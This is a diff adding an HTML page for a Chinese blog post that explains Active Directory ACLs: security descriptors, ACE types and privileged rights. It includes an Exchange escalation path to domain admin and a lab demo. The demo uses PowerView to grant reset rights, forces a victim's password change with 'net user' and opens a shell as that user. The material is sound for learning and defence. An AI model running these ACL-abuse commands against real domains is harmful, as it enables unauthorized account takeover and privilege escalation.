@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="SeikoSrp">
+
+
+
+
+
+
+<title>AD域中的ACL研究 | a blog</title>
+
+
+
+    <link rel="icon" href="/haidao.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        // console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">前往底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">AD域中的ACL研究</h1>
+            
+                <div class="post-meta">
+                    
+                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
+                    
+
+                    
+                        <span class="post-time">
+                        发布于: <a href="#">十二月 18, 2020&nbsp;&nbsp;18:47:41</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    分类:
+                            
+                                <a href="/categories/RedTeam-%E5%9F%9F%E5%AE%89%E5%85%A8/">RedTeam&域安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>安全客链接：<a href="https://www.anquanke.com/post/id/212163" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212163</a></p>
+<h2 id="ACL的概念和作用"><a href="#ACL的概念和作用" class="headerlink" title="ACL的概念和作用"></a>ACL的概念和作用</h2><h3 id="ACM："><a href="#ACM：" class="headerlink" title="ACM："></a>ACM：</h3><p>​    想要了解ACL首先需要了解Access Control Model（访问控制模型），根据官网（<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-model）给出的定义：" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-model）给出的定义：</a></p>
+<p>​    访问控制模型能够控制进程访问一些安全对象，或者是控制进程执行各种系统管理任务。原文：The access control model enables you to control the ability of a process to access securable objects or to perform various system administration tasks.</p>
+<p>访问模型包含哪些部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、Access Tokens（访问tokens）</span><br><span class="line">2、Security Descriptors（安全描述符）</span><br><span class="line">	a、Discretionary Access Control List (DACL)</span><br><span class="line">	b、System Access Control List (SACL)</span><br><span class="line">Access Control Lists（ACL）</span><br><span class="line">Access Control Entries（ACE）</span><br><span class="line">Access Rights and Access Masks（访问权限和访问掩码）</span><br></pre></td></tr></table></figure>
+
+<h3 id="Access-Token："><a href="#Access-Token：" class="headerlink" title="Access Token："></a>Access Token：</h3><p>当线程与<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/securable-objects" target="_blank" rel="noopener">安全对象</a>交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户，访问令牌包括以下信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">The security identifier (SID) for the user&#39;s account</span><br><span class="line">SIDs for the groups of which the user is a member</span><br><span class="line">A logon SID that identifies the current logon session</span><br><span class="line">A list of the privileges held by either the user or the user&#39;s groups</span><br><span class="line">An owner SID</span><br><span class="line">The SID for the primary group</span><br><span class="line">The default DACL that the system uses when the user creates a securable object without specifying a security descriptor</span><br><span class="line">The source of the access token</span><br><span class="line">Whether the token is a primary or impersonation token</span><br><span class="line">An optional list of restricting SIDs</span><br><span class="line">Current impersonation levels</span><br><span class="line">Other statistics</span><br></pre></td></tr></table></figure>
+
+<h3 id="Security-Descriptors安全描述符"><a href="#Security-Descriptors安全描述符" class="headerlink" title="Security Descriptors安全描述符"></a>Security Descriptors安全描述符</h3><p>SID（Security Identifiers）翻译成安全标识符。</p>
+<p>安全描述符标识对象的所有者，并包含以下访问控制列表：</p>
+<p>​    1、Discretionary Access Control List (DACL)  自由访问控制列表</p>
+<p>​    2、System Access Control List (SACL) 系统访问控制列表</p>
+<p>每一种控制列表中都存在若干条ACE（Access Control Entries）</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1571729717192.png" alt="1571729717192"></p>
+<p>用<a href="https://wenku.baidu.com/view/dba5b16e1eb91a37f1115cec.html这个链接下的一个图可以很清晰的说明什么是安全描述符：" target="_blank" rel="noopener">https://wenku.baidu.com/view/dba5b16e1eb91a37f1115cec.html这个链接下的一个图可以很清晰的说明什么是安全描述符：</a></p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1573981482195.png" alt="1573981482195"></p>
+<p>可以看到安全描述符由Header、SID和DACL、SACL组成</p>
+<h4 id="DACL"><a href="#DACL" class="headerlink" title="DACL"></a>DACL</h4><p>高级安全设置中的权限就是DACL的列表</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1573981538570.png" alt="1573981538570"></p>
+<h4 id="SACL"><a href="#SACL" class="headerlink" title="SACL"></a>SACL</h4><p>高级安全设置中的审核就是SACL的列表</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1573981601165.png" alt="1573981601165"></p>
+<p>其中的每一条都是一个ACE</p>
+<h4 id="ACE"><a href="#ACE" class="headerlink" title="ACE"></a>ACE</h4><p>ACE是针对特定用户或特定组的单个权限授予（或拒绝权利）的配置结构。ACE有许多不同类型，但是在Active Directory的权限中，只有四种不同的含义，两种分别用于授予和拒绝权限。</p>
+<p>1、Access Allowed ACE：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/security-descriptor-05.gif" alt="ACE"></p>
+<p>这种类型的ACE类型始终为0，设计目的是为了将权限轻松的分配给整个对象。ACE Flags确定这是继承权限还是显式给定的权限。所有此对象的子对象都会继承为ACE Type为0。</p>
+<p>2、Access Allowed Object ACE:</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/security-descriptor-06.gif" alt="Access Allowed Object ACE"></p>
+<p>此类ACE的类型始终为5，用于指定对象的某些属性的权限</p>
+<p>3、Access Denied ACE</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/security-descriptor-07.gif" alt="æç»è®¿é®ACE"></p>
+<p>此类ACE的值始终为1，用于简单的撤销整个对象的权限。ACE标志确定这是继承还是显示分配的撤销权限，并且所有的子对象都会继承这个权限。</p>
+<p>4、Access Denied Object ACE</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/security-descriptor-08.gif" alt="Access Denied Object ACE"></p>
+<p>此类ACE的类型始终为6，此对象可以撤销ACE特殊权限或有限的权限，例如针对某些属性撤销，这里提供的有和类型为5的ACE相同的例子（Object Type GUID），Flags字段指示是否存在对象类型字段或者继承类型字段，或者两者都有。</p>
+<h4 id="Access-Mask"><a href="#Access-Mask" class="headerlink" title="Access Mask"></a>Access Mask</h4><p>在ACE中有Access Mask这个字段，它代表着此条ACE所对应的权限</p>
+<h4 id="Trustees"><a href="#Trustees" class="headerlink" title="Trustees"></a>Trustees</h4><p>​    Trustees的意思为受委托人，受托者是一个ACE所应用到的用户账户，组账户或者是登录会话。也就是说，谁是某一个ACE的受托者，那么这条ACE中的Access Mask所对应的权限（可能是拒绝可能是通过）就会赋予受托者。</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574175170641.png" alt="1574175170641"></p>
+<h3 id="安全描述符枚举"><a href="#安全描述符枚举" class="headerlink" title="安全描述符枚举"></a>安全描述符枚举</h3><p>通过System.DirectoryServices.DirectorySearcher和System.DirectoryServices.SecurityMasks类可以对域内的安全描述符进行枚举：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$Searcher &#x3D; New-Object System.DirectoryServices.DirectorySearcher(&#39;(samaccountname&#x3D;xxm)&#39;)</span><br><span class="line">$Searcher.SecurityMasks &#x3D; [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Owner</span><br><span class="line">$Result &#x3D; $Searcher.FindOne()</span><br><span class="line">$Result.Properties.ntsecuritydescriptor[0].gettype()</span><br><span class="line"></span><br><span class="line">$ADSecurityDescriptor &#x3D; New-Object System.DirectoryServices.ActiveDirectorySecurity</span><br><span class="line">$ADSecurityDescriptor.SetSecurityDescriptorBinaryForm($Result.Properties.ntsecuritydescriptor[0])</span><br><span class="line">$ADSecurityDescriptor</span><br><span class="line">$ADSecurityDescriptor.Access</span><br></pre></td></tr></table></figure>
+
+<p>这里枚举的是安全描述符中的DACL中的每一个ACE（一共13条，和DACL中对应）：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1577976056171.png" alt="1577976056171"></p>
+<p>Powerviewer遍历:</p>
+<p>在Powerview的结果中不是根据每一条ACE来显示的，而是把每一个ACE中的每一个权限单独显示一条，所以结果的个数是不等于DACL的数量的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\powerview.ps1</span><br><span class="line">Get-DomainObjectAcl -Identity xxm -ResolveGUIDs</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1577977986682.png" alt="1577977986682"></p>
+<p>任何经过域验证的用户都可以枚举默认域中大多数对象的安全描述符。</p>
+<h3 id="线程与安全对象之间的交互："><a href="#线程与安全对象之间的交互：" class="headerlink" title="线程与安全对象之间的交互："></a>线程与安全对象之间的交互：</h3><p>在Access check中，系统将线程访问令牌中的安全信息与安全对象安全描述符中的安全信息进行比较。每一个进程都有一个primary token，用于描述与该进程关联的用户账户的安全上下文。默认情况下，当进程的线程与安全对象进行交互时，系统将使用primary token。</p>
+<p>系统检查对象的DACL，查找应用于用户的ACE，并从线程的访问令牌中分组SID，系统会检查每个SID，知道授予或拒绝访问，或者知道没有其他ACE要检查为止。</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/clip_image003.jpg" alt="clip_image003"></p>
+<h3 id="The-Security-Reference-Monitor-SRM-安全参考监视器"><a href="#The-Security-Reference-Monitor-SRM-安全参考监视器" class="headerlink" title="The Security Reference Monitor(SRM 安全参考监视器)"></a>The Security Reference Monitor(SRM 安全参考监视器)</h3><p>The Security Reference Monitor直译为SRM 安全参考监视器，在ACL中排列顺序继承等等都可能影响最后的结果，而SRM就是起到对顺序的评估作用。可参考：</p>
+<p><a href="https://networkencyclopedia.com/security-reference-monitor/" target="_blank" rel="noopener">https://networkencyclopedia.com/security-reference-monitor/</a></p>
+<p>[<a href="https://ldapwiki.com/wiki/Security%20Reference%20Monitor]" target="_blank" rel="noopener">https://ldapwiki.com/wiki/Security%20Reference%20Monitor]</a>(<a href="https://ldapwiki.com/wiki/Security" target="_blank" rel="noopener">https://ldapwiki.com/wiki/Security</a> Reference Monitor)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当登录的用户访问对象时，安全性参考监视器将检查对象的安全性描述符，以查看MSFT访问令牌中列出的SID是否与ACE条目匹配。如果存在匹配项，则匹配ACE中列出的安全权限将应用于该用户。</span><br></pre></td></tr></table></figure>
+
+<p>当“域管理员”组的成员请求更改用户密码的能力时，SRM必须决定是否应准许该请求。SRM会评估目标用户的DACL，确定“域管理员”组（进而是该组的成员）对用户具有完全控制权。</p>
+<p>评估对象的DACL时，SRM将按规范顺序读取ACE，ACE的排序如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.明确定义的DENY ACE。</span><br><span class="line">2.明确定义的ALLOW ACE。</span><br><span class="line">3.继承的DENY ACE。</span><br><span class="line">4.继承的ALLOW ACE。</span><br></pre></td></tr></table></figure>
+
+<h2 id="特权ACL"><a href="#特权ACL" class="headerlink" title="特权ACL"></a>特权ACL</h2><p>ACL是一个访问控制列表，是整个访问控制模型（ACM）的实现的总称。所以这里说的特权ACL，实际上是特权的权限，比如（复制目录更改所有项）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GenericAll</span><br><span class="line">GenericWrite</span><br><span class="line">WriteOwner(修改所有者)：</span><br><span class="line">WriteDACL：写DACL（有一个解释是WriteDACL是在攻击链中启用其他权利的权利）</span><br><span class="line">AllExtendedRights</span><br><span class="line">AddMembers：将任意用户、组或计算机添加到目标组。滥用方法：Add-DomainGroupMember。</span><br><span class="line">ForceChangePassword：强制更改密码，在不知道当前密码的情况下更改目标用户的密码，滥用方法：Set-DomainUserPassword</span><br><span class="line">Self (Self-Membership)</span><br></pre></td></tr></table></figure>
+
+<p>中文系统中的叫法会有一些不一样：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1571667379668.png" alt="1571667379668"></p>
+<h3 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h3><p>GenericAll在安全描述符中的Access Mask中进行标识，授予对目标对象的完全控制权，包括WriteDacl 和 WriteOwner 特权。可以使用PowerView中的Set-DomainUserPassword or Add-DomainGroupMember进行利用。</p>
+<h3 id="GenericWrite"><a href="#GenericWrite" class="headerlink" title="GenericWrite"></a>GenericWrite</h3><p>GenericWrite也是在Access Mask中进行标识，能够更新目标对象的参数值，比如ScriptPath，可以使用PowerView中的Set-DomainObject进行利用。</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578145396760.png" alt="1578145396760"></p>
+<h3 id="WriteDacl"><a href="#WriteDacl" class="headerlink" title="WriteDacl"></a>WriteDacl</h3><p>WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。</p>
+<h3 id="WriteOwner"><a href="#WriteOwner" class="headerlink" title="WriteOwner"></a>WriteOwner</h3><p>WriteOwner权限允许委托人修改对象的安全描述符的所有者部分。也就是说，假如用户A对administrator用户有这个权限，那么A只能利用这个权限给自己附加其他的权限。</p>
+<h2 id="针对特权ACL的DEMO"><a href="#针对特权ACL的DEMO" class="headerlink" title="针对特权ACL的DEMO"></a>针对特权ACL的DEMO</h2><h3 id="Organization-Management组"><a href="#Organization-Management组" class="headerlink" title="Organization Management组"></a>Organization Management组</h3><p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1571651414490.png" alt="1571651414490"></p>
+<p>Organization Management组的的组描述为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此管理角色组成员具有对 Exchange 对象及其在 Exchange 组织中的属性进行管理的权限。另外，成员还可以代表组织中的角色组和管理角色。不应删除此角色组。</span><br></pre></td></tr></table></figure>
+
+<p>在安装Exchange时会创建这个组，赋予其访问Exchange相关活动的权限。除了能访问这些Exchange设置选项之外，该组的成员还可以修改其他Exchange安全组的组成员关系。比如Exchange Trusted Subsystem安全组。这个组是Exchange Windows Permissions安全组的成员之一。</p>
+<p>Exchange Windows Permissions安全组具备该域对象的writeDACL权限。也就是说只要成为Organization Management组的成员，我们就可以提升成为域管理员权限。</p>
+<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制了Organization Management组内用户 --&gt; 将用户添加至Exchange Trusted Subsystem --&gt; 再次登录 --&gt; 用户成为Exchange Trusted Subsystem以及Exchange Windows Permission组成员 --&gt; 具有writeDACL权限</span><br></pre></td></tr></table></figure>
+
+<h3 id="User用户的GenericAll权限"><a href="#User用户的GenericAll权限" class="headerlink" title="User用户的GenericAll权限"></a>User用户的GenericAll权限</h3><p>使用zhangs账户和xxm账户做演示：</p>
+<p>两个账户的SID分别为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zhangs:</span><br><span class="line">S-1-5-21-3305457972-2547556381-742707129-1604</span><br><span class="line">xxm:</span><br><span class="line">S-1-5-21-3305457972-2547556381-742707129-1105</span><br></pre></td></tr></table></figure>
+
+<p>这里使用zhangs账户，所在的主机是win2012，然后使用PowerView的函数Get-ObjectACL查看对zhangs具有GenericAll权限的项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ObjectAcl -SamAccountName zhangs -ResolveGUIDs | ? &#123;$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574346548998.png" alt="1574346548998"></p>
+<p>在看一下xxm的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ObjectAcl -SamAccountName xxm -ResolveGUIDs | ? &#123;$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574351798500.png" alt="1574351798500"></p>
+<p>然后在域控dc2012上设置xxm账户的DACL,添加对xxm的完全控制(GenericAll)权限：</p>
+<p>命令设置：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> zhangs <span class="literal">-PrincipalIdentity</span> xiaom <span class="literal">-Rights</span> ResetPassword <span class="literal">-Verbose</span></span><br><span class="line"><span class="comment"># 在zhangs的DACL中添加一条允许xiaom进行重置密码的ACE</span></span><br><span class="line"><span class="comment"># powerviewer支持的类型'All', 'ResetPassword', 'WriteMembers', 'DCSync'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574351884195.png" alt="1574351884195"></p>
+<p>再在win2012上使用之前的命令查看ActiveDirectoryRights属性等于GenericAll的acl发现多了一条</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574351968816.png" alt="1574351968816"></p>
+<p>这条ACL的含义是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhangs账户对xxm账户具有完全管理(GenericAll)权限</span><br></pre></td></tr></table></figure>
+
+<p>在设置ACL之前和设置之后使用zhangs账户权限设置xxm账户的密码可以看到区别(设置完成之后会立即生效)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xxm admin123! &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574352158367.png" alt="1574352158367"></p>
+<p>此时再使用已经修改的密码结合runas命令就可以直接创建一个xxm权限的cmd窗口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas &#x2F;noprofile &#x2F;user:test\xxm cmd</span><br></pre></td></tr></table></figure>
+
